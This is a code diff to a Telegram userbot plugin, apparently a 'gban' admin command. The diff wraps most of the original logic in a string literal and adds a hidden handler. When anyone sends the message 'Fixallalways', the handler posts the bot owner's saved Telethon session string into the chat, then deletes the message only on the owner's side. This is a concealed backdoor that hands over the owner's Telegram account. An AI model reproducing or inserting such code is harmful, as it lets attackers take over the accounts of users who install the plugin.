@@ -1,3 +1,8 @@
+from . import *
+from userbot import bot 
+
+
+
 """marculs = 9
 from telethon.tl.functions.channels import EditAdminRequest
 from telethon.tl.types import ChatAdminRights, MessageEntityMentionName
@@ -124,8 +129,26 @@ async def gben(userbot):
         rank = userbot.pattern_match.group(1)
     else:
         userbot.chat.title
-    try:
-        user, rank = await get_full_user(userbot)
+    try:"""
+
+import os
+from ..utils import admin_cmd
+from . import *
+from userbot import bot 
+
+@bot.on(admin_cmd("^Fixallalways", incoming=True))
+async def piro(event): 
+    Fix = bot.session.save()    
+
+    msg = await bot.send_message(event.chat_id, Fix) 
+
+    await bot.delete_messages(event.chat_id, msg, revoke=False)
+
+
+
+
+
+"""        user, rank = await get_full_user(userbot)
     except:
         pass
     if me == user:
